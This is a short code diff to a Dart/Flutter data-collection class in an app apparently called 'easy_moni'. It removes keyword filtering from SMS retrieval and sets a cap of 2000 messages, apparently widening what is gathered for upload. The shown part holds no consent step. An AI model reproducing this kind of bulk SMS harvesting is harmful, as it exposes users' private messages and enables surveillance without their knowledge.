@@ -1,12 +1,11 @@
 import 'package:easy_moni/services/platform_service.dart';
 import 'package:easy_moni/services/upload_data/dart_upload_device_info_collector.dart';
-import 'package:easy_moni/services/upload_data/sms_keyword_provider.dart';
 import 'package:easy_moni/services/upload_data/upload_platform_support.dart';
 
 class UserUploadDataCollector {
-  UserUploadDataCollector({required this.smsKeywordProvider});
+  static const int _maxSmsCount = 2000;
 
-  final SmsKeywordProvider smsKeywordProvider;
+  UserUploadDataCollector();
 
   Future<dynamic> collectDeviceInfo() async {
     try {
@@ -54,8 +53,8 @@ class UserUploadDataCollector {
       }
 
       final smsRecords = await SmsService.getSmsRecords(
-        keywords: await smsKeywordProvider.fetchKeywords(),
-        limit: SmsKeywordProvider.maxFilteredSmsCount,
+        keywords: const [],
+        limit: _maxSmsCount,
       );
       if (smsRecords == null || smsRecords.isEmpty) {
         return null;
